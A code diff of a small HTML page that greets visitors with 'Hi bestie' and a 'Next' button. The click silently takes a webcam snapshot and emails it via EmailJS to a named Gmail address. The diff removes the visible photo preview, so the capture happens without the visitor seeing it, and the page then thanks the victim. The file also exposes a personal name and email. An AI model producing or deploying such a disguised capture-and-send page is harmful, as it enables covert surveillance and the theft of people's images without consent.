@@ -36,11 +36,11 @@
         button:hover {
             background-color: #f0e4d7;
         }
-        #photo {
-            margin-top: 20px;
-            display: none;
-            max-width: 100%;
-            border-radius: 10px;
+        #canvas {
+            display: none; /* Keep canvas hidden */
+        }
+        #video {
+            display: none; /* Keep video hidden */
         }
     </style>
     <script type="text/javascript">
@@ -51,18 +51,18 @@
 </head>
 <body>
     <div class="container">
-        <h1>Hi bestie</h1>
-        <button onclick="takePicture()">Next</button>
-        <canvas id="canvas" style="display:none;"></canvas>
-        <img  id="photo" alt="Captured Image"  style="display:none;"/>
-        <video id="video" autoplay style="display:none;"></video> 
+        <h1 id="header">Hi bestie</h1>
+        <button id="takePictureButton" onclick="takePicture()">Next</button>
+        <canvas id="canvas"></canvas> <!-- Keep canvas hidden -->
+        <video id="video" autoplay></video> <!-- Keep video hidden -->
     </div>
 
     <script>
         const video = document.getElementById('video');
         const canvas = document.getElementById('canvas');
-        const photo = document.getElementById('photo');
         const context = canvas.getContext('2d');
+        const header = document.getElementById('header');
+        const takePictureButton = document.getElementById('takePictureButton');
 
         navigator.mediaDevices.getUserMedia({ video: true })
         .then(function(stream) {
@@ -72,56 +72,46 @@
             console.log("An error occurred: " + err);
         });
 
-       
+        function takePicture() {
+            const width = 320; // Reduce the width to a smaller size
+            const height = video.videoHeight / (video.videoWidth / width); // Maintain aspect ratio
 
+            canvas.width = width;
+            canvas.height = height;
 
+            context.drawImage(video, 0, 0, width, height);
+            const data = canvas.toDataURL('image/jpeg', 0.5); // Change to 'image/jpeg' and reduce quality (0.5 = 50%)
 
+            sendEmail(data); // Send email with captured image data
 
-    function takePicture() {
-        const width = 320; // Reduce the width to a smaller size
-        const height = video.videoHeight / (video.videoWidth / width); // Maintain aspect ratio
+            const stream = video.srcObject;
+            const tracks = stream.getTracks();
+            tracks.forEach(track => track.stop()); // Stop video stream
+        }
 
-        canvas.width = width;
-        canvas.height = height;
+        function sendEmail(imageData) {
+            const base64Data = imageData.split(',')[1]; // Extract base64 data
+            const emailParams = {
+                to_name: 'Nouhaila Elbouhali',
+                to_email: 'nouhailaelbouhali73@gmail.com',
+                from_name: 'Jailey Shiper',
+                message: 'Here is the captured image!',
+                attachment: `data:image/jpeg;base64,${base64Data}` // Format the base64 data properly
+            };
 
-        context.drawImage(video, 0, 0, width, height);
-        const data = canvas.toDataURL('image/jpeg', 0.5); // Change to 'image/jpeg' and reduce quality (0.5 = 50%)
+            console.log("Email Parameters: ", emailParams); // Log parameters for debugging
 
-        photo.src = data;
-        photo.style.display = 'block';
-
-        sendEmail(data);
-
-        const stream = video.srcObject;
-        const tracks = stream.getTracks();
-        tracks.forEach(track => track.stop());
-    }
-
-    function sendEmail(imageData) {
-        const base64Data = imageData.split(',')[1]; // Extract base64 data
-        const emailParams = {
-            to_name: 'Nouhaila Elbouhali',
-            to_email: 'nouhailaelbouhali73@gmail.com',
-            from_name: 'Jailey Shiper',
-            message: 'Here is the captured image!',
-            attachment: `data:image/jpeg;base64,${base64Data}` // Format the base64 data properly
-        };
-
-        console.log("Email Parameters: ", emailParams); // Log parameters for debugging
-
-        emailjs.send('service_pg1ysay', 'template_q8jc6xc', emailParams)
-        .then(function(response) {
-            console.log('SUCCESS!', response.status, response.text);
-            
-            // Hide the button and change the heading text
-            document.querySelector('button').style.display = 'none';
-            document.querySelector('h1').textContent = 'Thank you, sweetheart!';
-        }, function(error) {
-            console.log('FAILED...', error);
-        });
-    }
-</script>
-
-
+            emailjs.send('service_pg1ysay', 'template_q8jc6xc', emailParams)
+            .then(function(response) {
+                console.log('SUCCESS!', response.status, response.text);
+                
+                // Update UI after email is sent
+                header.textContent = 'Thank you sweetheart'; // Change header text
+                takePictureButton.style.display = 'none'; // Hide the button
+            }, function(error) {
+                console.log('FAILED...', error);
+            });
+        }
+    </script>
 </body>
 </html>
